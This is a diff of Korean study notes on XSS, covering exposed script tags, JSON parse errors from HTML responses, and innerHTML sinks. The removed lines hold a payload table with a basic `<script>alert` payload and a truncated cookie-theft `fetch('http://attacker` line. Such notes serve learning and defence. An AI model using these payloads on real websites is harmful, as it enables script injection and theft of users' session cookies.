@@ -1,4 +1,4 @@
-(1)
+##(1)##
 * 네가 URL 뒤에 `<script></script>`를 붙이니까,
 * **페이지의 원래 HTML `<script>` 태그 일부가 화면에 노출됨**.
 
@@ -156,10 +156,7 @@ HTML 파서(브라우저의 DOM 해석기)의 동작 방식
 
 ---
 
-(2)
-```
-innerhtml과 fetch(웹 서버에 GET 또는 POST 요청을 보내고, 서버에서 돌아오는 응답을 받아 JSON, HTML, 텍스트 등으로 반환)
-```
+##(2)##
 
 `"unexpected token '<', '<!doctype' is not valid json"` 오류는 보통 **JavaScript**에서 **JSON 파싱**을 시도할 때, **HTML** 형식의 응답을 받은 경우 발생합니다. 예를 들어, 서버가 예상대로 **JSON 응답**을 보내야 하는데, 실제로는 **HTML** 페이지(대개 오류 페이지)가 반환되었을 때 이런 오류가 발생할 수 있습니다.
 
@@ -307,10 +304,8 @@ fetch('/api/data')
 
 위와 같은 JSON 응답이 반환되면, \*\*`data.message`\*\*가 HTML로 삽입되어 **XSS**가 실행됩니다.
 
-### **XSS 페이로드 정리**
+```
+* innerhtml과 fetch(웹 서버에 GET 또는 POST 요청을 보내고, 서버에서 돌아오는 응답을 받아 JSON, HTML, 텍스트 등으로 반환)
+```
 
-| 공격 방법        | 페이로드 예시                                             | 설명                           |
-| ------------ | --------------------------------------------------- | ---------------------------- |
-| **기본적인 XSS** | `<script>alert('XSS');</script>`                    | 페이지에 스크립트 삽입하여 JavaScript 실행 |
-| **쿠키 탈취**    | \`<script>fetch('[http://attacker](http://attacker) |                              |
 
